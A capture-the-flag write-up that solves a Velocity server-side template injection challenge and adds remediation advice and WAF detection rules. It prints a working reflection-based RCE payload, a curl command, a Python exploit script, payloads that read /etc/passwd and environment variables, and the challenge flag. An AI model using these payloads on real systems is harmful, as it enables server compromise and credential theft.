# Labyrinth Linguist CTF Challenge - Solution Writeup

**Challenge Name:** Labyrinth Linguist  
**Category:** Web  
**Difficulty:** Easy  
**Points:** 975  
**Date Solved:** 2025-11-09

---

## Challenge Description

"You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive."

---

## Target Information

- **IP Address:** 83.136.249.223
- **Port:** 48649
- **URL:** http://83.136.249.223:48649

---

## Reconnaissance

### Initial Analysis

The application is a simple web form that claims to translate English text to "Voxalith" (a fictional ancient language).

**Application Behavior:**
```html
POST / with data: text=hello world
Response: Displays "hello world" in an <h2> tag
```

The input text is reflected directly back to the user without any visible transformation.

### Technology Identification

- Error endpoint returns JSON: `{"timestamp":...,"status":404,"error":"Not Found"}`
- This pattern indicates **Spring Boot** framework
- pom.xml in the ZIP file confirms Java/Maven project
- Content-Type: `text/plain;charset=UTF-8`

---

## Vulnerability Discovery

### Testing for Server-Side Template Injection (SSTI)

Tested multiple Java template engines:

```python
# Thymeleaf (Spring default)
"${7*7}" => ${7*7} (no execution)
"#{7*7}" => #{7*7} (no execution)
"[[${7*7}]]" => [[${7*7}]] (no execution)

# FreeMarker
"${7*7}" => ${7*7} (no execution)
"<#assign x=7*7>${x}" => (no execution)

# Apache Velocity ✓
"#set($x=7*7)$x" => 49 (EXECUTED!)
```

**Discovery:** The application uses **Apache Velocity** template engine and is vulnerable to SSTI!

### Vulnerability Confirmation

```bash
# Test 1: Basic math
POST / with text=#set($x=7*7)$x
Response: 49

# Test 2: Access Java classes
POST / with text=#set($str='')$str.class.name
Response: java.lang.String

# Test 3: Access Runtime class
POST / with text=#set($str='')#set($rt=$str.class.forName('java.lang.Runtime'))$rt
Response: class java.lang.Runtime
```

---

## Exploitation

### Apache Velocity SSTI to RCE

Apache Velocity allows access to Java classes through reflection, enabling Remote Code Execution.

**Attack Chain:**
1. Get empty string to access class methods
2. Use `Class.forName()` to load Java classes
3. Get `Runtime` class
4. Execute shell commands via `Runtime.exec()`
5. Read command output

### Payload Construction

```velocity
#set($str='')
#set($rt=$str.class.forName('java.lang.Runtime'))
#set($chr=$str.class.forName('java.lang.Character'))
#set($cmd=$rt.getRuntime().exec('cat /flag.txt'))
#set($input=$cmd.getInputStream())
#set($isr=$str.class.forName('java.io.InputStreamReader').getConstructor($str.class.forName('java.io.InputStream')).newInstance($input))
#set($br=$str.class.forName('java.io.BufferedReader').getConstructor($str.class.forName('java.io.Reader')).newInstance($isr))
#set($line=$br.readLine())
$line
```

**Explanation:**
1. `#set($str='')` - Create empty string to access String class
2. `$str.class.forName('java.lang.Runtime')` - Load Runtime class
3. `$rt.getRuntime().exec('cat /flag.txt')` - Execute command
4. Read output using InputStreamReader and BufferedReader
5. `$line` - Display the output

### Execution

```bash
curl -X POST http://83.136.249.223:48649/ \
  -d "text=#set(\$str='')#set(\$rt=\$str.class.forName('java.lang.Runtime'))#set(\$chr=\$str.class.forName('java.lang.Character'))#set(\$cmd=\$rt.getRuntime().exec('cat /flag.txt'))#set(\$input=\$cmd.getInputStream())#set(\$isr=\$str.class.forName('java.io.InputStreamReader').getConstructor(\$str.class.forName('java.io.InputStream')).newInstance(\$input))#set(\$br=\$str.class.forName('java.io.BufferedReader').getConstructor(\$str.class.forName('java.io.Reader')).newInstance(\$isr))#set(\$line=\$br.readLine())\$line"
```

---

## Flag

```
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_9c6a85ba5184d27ecdecf77c6b2177db}
```

**Message:** "Fiery templates from the depths!!" - referring to the template injection vulnerability

---

## Proof of Concept

### Python Exploit Script

```python
#!/usr/bin/env python3
import requests

url = "http://83.136.249.223:48649/"

# Apache Velocity SSTI to RCE - Read /flag.txt
payload = """#set($str='')#set($rt=$str.class.forName('java.lang.Runtime'))#set($chr=$str.class.forName('java.lang.Character'))#set($cmd=$rt.getRuntime().exec('cat /flag.txt'))#set($input=$cmd.getInputStream())#set($isr=$str.class.forName('java.io.InputStreamReader').getConstructor($str.class.forName('java.io.InputStream')).newInstance($input))#set($br=$str.class.forName('java.io.BufferedReader').getConstructor($str.class.forName('java.io.Reader')).newInstance($isr))#set($line=$br.readLine())$line"""

resp = requests.post(url, data={"text": payload})

# Extract flag from response
if '<h2 class="fire">' in resp.text:
    flag = resp.text.split('<h2 class="fire">')[1].split('</h2>')[0]
    print(f"[+] Flag: {flag}")
else:
    print("[-] Flag not found")
```

### Alternative Commands

```velocity
# List files
#set($str='')#set($rt=$str.class.forName('java.lang.Runtime'))#set($cmd=$rt.getRuntime().exec('ls -la'))...

# Read /etc/passwd
#set($str='')#set($rt=$str.class.forName('java.lang.Runtime'))#set($cmd=$rt.getRuntime().exec('cat /etc/passwd'))...

# Get environment variables
#set($str='')#set($rt=$str.class.forName('java.lang.Runtime'))#set($cmd=$rt.getRuntime().exec('env'))...
```

---

## Vulnerability Analysis

### Root Cause

The application uses Apache Velocity template engine to render user input without proper sanitization or sandboxing.

**Vulnerable Code Pattern:**
```java
// Likely code in Main.java
public String translate(@RequestParam String text) {
    VelocityEngine ve = new VelocityEngine();
    ve.init();
    
    Template t = ve.getTemplate("index.html");
    VelocityContext context = new VelocityContext();
    context.put("text", text);  // User input directly in template context
    
    StringWriter writer = new StringWriter();
    t.merge(context, writer);
    return writer.toString();
}
```

The user-controlled `text` parameter is placed directly into the Velocity template context, allowing template injection.

### Impact

**Severity:** Critical (CVSS 9.8)

**Capabilities:**
- Remote Code Execution
- Full server compromise
- Read sensitive files (credentials, source code, database configs)
- Lateral movement within network
- Data exfiltration

---

## Remediation Recommendations

### 1. Never Use User Input in Templates

```java
// BAD - User input as template
String template = userInput;
velocityEngine.evaluate(context, writer, "template", template);

// GOOD - User input as data only
context.put("userText", userInput);  // Escaped automatically
template = velocityEngine.getTemplate("static-template.vm");
```

### 2. Disable Dangerous Features

If Velocity must be used, restrict access to classes:

```java
VelocityEngine ve = new VelocityEngine();
ve.setProperty("runtime.introspector.uberspect", 
    "org.apache.velocity.util.introspection.SecureUberspector");
ve.init();
```

### 3. Input Validation and Sanitization

```java
// Whitelist allowed characters
if (!text.matches("^[a-zA-Z0-9\\s]+$")) {
    throw new IllegalArgumentException("Invalid characters");
}
```

### 4. Use Safe Template Engines

Consider alternatives that don't allow code execution:
- **Mustache** - Logic-less templates
- **Handlebars** - Limited logic
- **Thymeleaf with strict mode** - Better sandboxing

### 5. Security Scanning

- Use SAST tools to detect template injection vulnerabilities
- Regular security audits
- Dependency scanning for known vulnerabilities

---

## Detection Methods

### Log Patterns

```
# Suspicious Velocity syntax
#set(
$str.class
.forName(
Runtime
exec(
```

### WAF Rules

```
# Block common SSTI payloads
SecRule ARGS "@rx #set\(" "id:1000,deny,msg:'Velocity SSTI attempt'"
SecRule ARGS "@rx \.class\.forName" "id:1001,deny,msg:'Java reflection attempt'"
SecRule ARGS "@rx Runtime\.exec" "id:1002,deny,msg:'Command execution attempt'"
```

---

## Lessons Learned

1. **Template engines are dangerous** - Never render user input as templates
2. **Defense in depth** - Even "safe" operations like translation can be attack vectors
3. **Framework knowledge** - Understanding Java template engines is crucial for security
4. **Testing methodology** - Systematically test different template syntaxes
5. **Reflection is powerful** - Java reflection bypasses many security controls

---

## OWASP References

- **A03:2021 – Injection** (Server-Side Template Injection)
- **CWE-94: Improper Control of Generation of Code (Code Injection)**
- **CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine**

---

## Tools Used

- `curl` - HTTP client
- `Python` + `requests` - Exploitation scripting
- Manual code analysis

---

## Timeline

1. **00:00** - Challenge started
2. **00:02** - Identified reflection behavior
3. **00:05** - Tested multiple template engines
4. **00:08** - Discovered Apache Velocity SSTI
5. **00:10** - Crafted RCE payload
6. **00:12** - Retrieved flag

**Total Time:** ~12 minutes

---

## Additional Notes

- The challenge name "Labyrinth Linguist" hints at language translation
- The story mentions "reverse engineering the device" - referring to finding the vulnerability
- Apache Velocity is less common than Thymeleaf/FreeMarker but still found in legacy Java applications
- The flag message "fiery templates from the depths" is a play on the challenge theme

---

## Key Takeaway

**Server-Side Template Injection (SSTI) in Java applications can lead to Remote Code Execution through reflection. Always treat user input as untrusted data, never as code or templates.**

